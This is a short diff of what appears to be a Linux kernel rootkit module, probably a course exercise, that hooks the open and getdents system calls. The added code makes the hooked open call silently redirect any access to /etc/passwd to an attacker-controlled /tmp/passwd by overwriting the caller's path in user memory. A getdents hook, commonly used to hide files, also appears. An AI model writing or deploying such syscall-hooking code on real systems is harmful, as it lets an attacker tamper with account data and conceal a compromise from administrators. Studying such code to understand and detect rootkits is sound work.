@@ -54,8 +54,15 @@ asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent * dirp,
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
-  printk(KERN_INFO "Very, very Sneaky!\n");
-  return original_call(pathname, flags);
+  printk(KERN_INFO "inside sneaky open!\n");
+  if(strcmp(pathname, "/etc/passwd") == 0) {
+    const char * newPath = "/tmp/passwd";
+    copy_to_user(pathname, newPath, strlen(newPath)+1);
+    return original_call(pathname, flags);
+  }
+  else {
+    return original_call(pathname, flags);
+  } 
 }
 
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent * dirp, unsigned int count) {
